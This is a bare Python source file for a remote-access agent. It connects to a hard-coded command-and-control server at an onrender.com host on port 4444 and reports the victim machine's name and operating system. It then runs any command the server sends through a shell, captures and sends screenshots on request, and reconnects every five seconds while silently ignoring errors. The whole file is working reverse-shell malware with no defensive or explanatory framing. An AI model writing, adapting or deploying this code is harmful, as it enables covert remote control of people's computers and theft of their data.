import socket
import subprocess
import time
import os
import platform
from PIL import ImageGrab

SERVER_HOST = 'mosy-c2-server.onrender.com'
SERVER_PORT = 4444

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            
            pc_name = platform.node()
            os_info = platform.system() + " " + platform.release()
            client_info = f"AGENT|{pc_name}|{os_info}"
            s.sendall(client_info.encode('utf-8'))
            
            while True:
                raw_len = s.recv(4)
                if not raw_len:
                    break
                cmd_len = int.from_bytes(raw_len, 'big')
                
                command = b""
                while len(command) < cmd_len:
                    packet = s.recv(cmd_len - len(command))
                    if not packet:
                        break
                    command += packet
                
                command = command.decode('utf-8', errors='ignore')
                if not command:
                    break
                
                if command == 'screenshot':
                    try:
                        screenshot_path = 'screen.png'
                        img = ImageGrab.grab()
                        img.save(screenshot_path)
                        with open(screenshot_path, 'rb') as f:
                            data = f.read()
                        s.sendall(len(data).to_bytes(4, 'big') + data)
                        os.remove(screenshot_path)
                    except Exception as e:
                        err = str(e).encode('utf-8')
                        s.sendall(len(err).to_bytes(4, 'big') + err)
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    except Exception as e:
                        output = str(e)
                    
                    if not output:
                        output = "Buyruq bajarildi (natija yo'q)."
                    out_bytes = output.encode('utf-8')
                    s.sendall(len(out_bytes).to_bytes(4, 'big') + out_bytes)
                    
            s.close()
        except:
            pass
        
        time.sleep(5)

if __name__ == '__main__':
    connect()